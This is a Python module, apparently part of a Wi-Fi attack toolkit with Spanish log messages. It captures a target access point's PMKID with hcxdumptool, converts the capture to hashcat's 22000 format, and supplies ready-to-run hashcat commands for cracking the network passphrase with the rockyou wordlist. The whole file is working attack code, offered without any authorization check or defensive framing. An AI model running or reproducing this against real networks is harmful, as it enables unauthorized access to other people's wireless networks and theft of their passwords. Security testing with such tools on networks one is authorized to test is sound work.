import subprocess
import os
import threading
from core.logger import get_logger
from core.event_bus import event_bus
from config import config

logger = get_logger('wifi.pmkid')

CAP_FILE  = '/tmp/sentinel_pmkid.pcapng'
HASH_FILE = '/tmp/sentinel_pmkid.hc22000'

class PMKIDCapture:
    def __init__(self):
        self.iface    = config.WIFI_IFACE
        self._running = False
        self._thread  = None

    def capture(self, bssid: str, timeout: int = 30) -> bool:
        """Captura PMKID con hcxdumptool."""
        if self._running:
            logger.warning("PMKID capture ya en curso")
            return False

        self._running = True
        self._thread  = threading.Thread(
            target=self._capture_worker,
            args=(bssid, timeout),
            daemon=True
        )
        self._thread.start()
        return True

    def _capture_worker(self, bssid: str, timeout: int) -> None:
        try:
            filter_bssid = bssid.replace(':', '').lower()
            cmd = [
                'hcxdumptool',
                '-i', self.iface,
                '-o', CAP_FILE,
                f'--filterlist_ap={filter_bssid}',
                '--filtermode=2',
                f'--tot={timeout}'
            ]
            logger.info(f"Capturando PMKID de {bssid}...")
            subprocess.run(cmd, timeout=timeout + 5)
            self._convert_to_hashcat()
        except FileNotFoundError:
            logger.error("hcxdumptool no instalado")
        except subprocess.TimeoutExpired:
            logger.warning("PMKID capture timeout")
        finally:
            self._running = False

    def _convert_to_hashcat(self) -> None:
        if not os.path.exists(CAP_FILE):
            logger.warning("No se generó archivo de captura")
            return
        try:
            subprocess.run(
                ['hcxpcapngtool', '-o', HASH_FILE, CAP_FILE],
                check=True
            )
            if os.path.exists(HASH_FILE):
                logger.info(f"Hash listo para hashcat: {HASH_FILE}")
                event_bus.publish('wifi.pmkid_ready', {
                    'hash_file': HASH_FILE,
                    'hint':      f'hashcat -m 22000 {HASH_FILE} wordlist.txt'
                })
        except Exception as e:
            logger.error(f"Error convirtiendo captura: {e}")

    def crack_hint(self) -> str:
        return f"hashcat -m 22000 {HASH_FILE} /usr/share/wordlists/rockyou.txt"

    def is_running(self) -> bool:
        return self._running